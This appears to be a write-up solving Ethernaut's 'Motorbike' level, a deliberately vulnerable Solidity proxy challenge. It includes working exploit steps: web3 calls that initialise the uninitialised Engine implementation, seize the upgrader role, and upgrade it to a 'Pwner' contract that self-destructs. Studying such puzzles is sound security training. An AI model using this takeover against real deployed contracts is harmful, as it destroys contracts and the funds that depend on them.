# [25. Motorbike](https://ethernaut.openzeppelin.com/level/0x58Ab506795EC0D3bFAE4448122afa4cDE51cfdd2)

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
  // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
  bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
  
  struct AddressSlot {
    address value;
  }
  
  // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
  constructor(address _logic) public {
    require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
    _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
    (bool success,) = _logic.delegatecall(
      abi.encodeWithSignature("initialize()")
    );
    require(success, "Call failed");
  }

  // Delegates the current call to `implementation`.
  function _delegate(address implementation) internal virtual {
    // solhint-disable-next-line no-inline-assembly
    assembly {
      calldatacopy(0, 0, calldatasize())
      let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
      returndatacopy(0, 0, returndatasize())
      switch result
      case 0 { revert(0, returndatasize()) }
      default { return(0, returndatasize()) }
    }
  }

  // Fallback function that delegates calls to the address returned by `_implementation()`. 
  // Will run if no other function in the contract matches the call data
  fallback () external payable virtual {
    _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
  }

  // Returns an `AddressSlot` with member `value` located at `slot`.
  function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
    assembly {
      r_slot := slot
    }
  }
}

contract Engine is Initializable {
  // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
  bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

  address public upgrader;
  uint256 public horsePower;

  struct AddressSlot {
    address value;
  }

  function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
  }

  // Upgrade the implementation of the proxy to `newImplementation`
  // subsequently execute the function call
  function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
    _authorizeUpgrade();
    _upgradeToAndCall(newImplementation, data);
  }

  // Restrict to upgrader role
  function _authorizeUpgrade() internal view {
    require(msg.sender == upgrader, "Can't upgrade");
  }

  // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
  function _upgradeToAndCall(
    address newImplementation,
    bytes memory data
  ) internal {
    // Initial upgrade and setup call
    _setImplementation(newImplementation);
    if (data.length > 0) {
      (bool success,) = newImplementation.delegatecall(data);
      require(success, "Call failed");
    }
  }
  
  // Stores a new address in the EIP1967 implementation slot.
  function _setImplementation(address newImplementation) private {
    require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
    
    AddressSlot storage r;
    assembly {
      r_slot := _IMPLEMENTATION_SLOT
    }
    r.value = newImplementation;
  }
}
```

We have another proxy-based puzzle here. This time, we see that [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967) is used, which means it is safe against storage collisions. More specifically, EIP-1967 defines a standard storage slot that the proxy uses. As per this standard, the logic contract is stored at `bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)`, which is what we see in the code too.

When we examine the Motorbike contract, we realize that it is just a proxy with its logic being the Engine contract. Engine contract is [Initializable](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers). There is a question mark here though: the `initializer` is called from the proxy, so the affected storage is that of the Motorbike, not the Engine! Consequently, Motorbike should have the results of initialization in it's storage, while Engine should not.

The `Initializable` contract has 2 storage variables, both 1-byte booleans. The Engine contract has two variables, a 20-byte address and a 32-byte unsigned integer. As per the EVM optimization, 2 booleans and 1 address will all occupy the same slot. So we should see an address and two boolean values side by side at the 0th position.

```js
// Proxy storage
await web3.eth.getStorageAt(contract.address, 0)
// '0x0000000000000000000058ab506795ec0d3bfae4448122afa4cde51cfdd20001'

// Engine address
const _IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
const engineAddress = await web3.eth.getStorageAt(
  contract.address,
  web3.utils.hexToNumberString(_IMPLEMENTATION_SLOT)
)

await web3.eth.getStorageAt(engineAddress, 0)
// '0x0000000000000000000000000000000000000000000000000000000000000000'
```

Indeed, the initializer has mistakenly wrote to the proxy storage! The Engine contract has no idea that it is initialized, so we can call the initialize function there.

```js
await web3.eth.sendTransaction({
  from: player,
  to: engine,
  data: '0x8129fc1c' // initialize()
})
```

If we check the storage of Engine again, we will see that it is updated. We are now the `upgrader` and we can call the `updateToAndCall` function with a new contract of our own, and give `data` to make it `selfdestruct`.

We can write a small contract such as:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract Pwner {
  function pwn() public {
    selfdestruct(address(0));
  }
}
```

The objective is to make this the Engine of the Motorbike, so we will make the call to the proxy. Since our function signature will have no match there, it will be delegated to the Engine and there the new implementation will be our `Pwner` contract. Afterwards, `pwn()` will be called and the new implementation will `selfdestruct`.

```js
const _function = {
  "inputs": [
    { 
      "name": "newImplementation",
      "type": "address"
    },
    { 
      "name": "data",
      "type": "bytes"
    }
  ],
  "name": "upgradeToAndCall", 
  "type": "function"
};
const _parameters = [
  '0xad3359eAbEec598f7eBEDdb14BC056ca57fa32B1', // Pwner
  '0xdd365b8b', // pwn()
];
const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
await web3.eth.sendTransaction({
  from: player, 
  to: engineAddress, // not Motorbike!
  data: _calldata
})
```

We are sending this transaction to Engine instead of Motorbike, because the Engine itself is like a proxy too. Notice in the `_upgradeToAndCall` internal function it makes a `delegatecall` to the `newImplementation`.

What `selfdestruct` within the `newImplementation` achieves here is that it actually destroys the calling Engine, not the Pwner contract! This is again because a `delegatecall` is used. If we check the Engine contract address with block explorer, we will see that it did indeed `selfdestruct`.
